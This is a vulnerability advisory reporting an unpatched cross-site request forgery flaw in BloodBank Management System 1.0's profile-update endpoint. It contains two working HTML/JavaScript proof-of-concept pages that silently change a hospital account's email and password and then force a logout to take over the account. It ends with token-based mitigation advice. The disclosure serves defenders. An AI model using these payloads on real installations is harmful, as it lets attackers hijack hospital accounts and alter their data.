
## **Affected Version:**
- **BloodBank Management System**: 1.0

## **Vulnerability Information:**
- **Vulnerability Type:** Cross Site Request Forgery (CSRF)
- **Severity:** HIGH
- **Status:** Unpatched

## **Vulnerable Endpoint:**
- **Path:** `/file/updateprofile.php`

## **Vulnerability Description:**
There is a CSRF vulnerability on this endpoint `/file/updateprofile.php` which allows a remote user to update the user details of a hospital and can can lead to account takeover as the attacker can update all the information from the email to the password effectively increasing chances of account takeover

Successful exploitation can lead to **unauthorized actions ie deletion of data** on behalf of the victim. Additionally, this could be exploited by visiting malicious websites with the payload.

---

## **Proof of Concept (PoC):**

Below is an example of a **CSRF POC Attack** that updates the profile details of a logged in hospital account, host the file on an attacker controlled domain in my case i was using `localhost`:

```html

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CSRF PoC with Logout Redirect</title>
</head>
<body>
    <h2>CSRF Proof of Concept with Chained Logout</h2>

    <!-- Form to exploit CSRF vulnerability for updating profile -->
    <form id="csrfForm" action="http://localhost.local/bloodbank/file/updateprofile.php" method="POST">
        <input type="hidden" name="hname" value="parirenyatwa">
        <input type="hidden" name="hemail" value="pari@hospital.co.zw">
        <input type="hidden" name="hpassword" value="pari1234">
        <input type="hidden" name="hphone" value="0777054000">
        <input type="hidden" name="hcity" value="harare">
        <input type="hidden" name="update" value="Update">
    </form>

    <script>
        // Submit the CSRF form to update profile
        document.getElementById("csrfForm").submit();
   </script>
</body>
</html>



```


## **Proof of Concept (POC) to Account TakeOver**

- The attacker can effectively update the profile detail manipulating the email and password and force a `logout CSRF` thereby achieving Account Take Over

```html

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CSRF PoC with XMLHttpRequest</title>
</head>
<body>
    <h2>CSRF Proof of Concept with XMLHttpRequest and Redirect</h2>

    <script>
        // Define the target URLs for the CSRF attack
        const updateUrl = "http://localhost.local/bloodbank/file/updateprofile.php";
        const logoutUrl = "http://localhost.local/bloodbank/logout.php";

        // Data for the profile update CSRF request
        const updateData = "hname=parirenyatwa&hemail=pari%40hospital.co.zw&hpassword=pari1234&hphone=0777054000&hcity=harare&update=Update";

        // Function to send the XMLHttpRequest
        function sendCSRFUpdate() {
            const xhr = new XMLHttpRequest();
            xhr.open("POST", updateUrl, true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

            // When the request is complete, redirect to the logout page
            xhr.onload = function() {
                if (xhr.status === 200) {
                    console.log("Profile update CSRF request completed");
                    // Redirect to logout URL to log the victim out
                    window.location.href = logoutUrl;
                } else {
                    console.error("Profile update failed with status:", xhr.status);
                }
            };

            // Send the request with the update data
            xhr.send(updateData);
        }

        // Trigger the CSRF attack by sending the update request
        sendCSRFUpdate();
    </script>
</body>
</html>



```

---



## **Impact:**
- **Data Manipulation:** Attackers could modify the content displayed to users.
- **Reputational Damage:** Users may lose trust in the system due to malicious behavior.

---

## **Mitigation Recommendations:**
1. **Use CSRF Token** Implement mechanism to deter cross domain access or put `csrf tokens` in your request and also avoid `GET` requests from making state changing actions

---
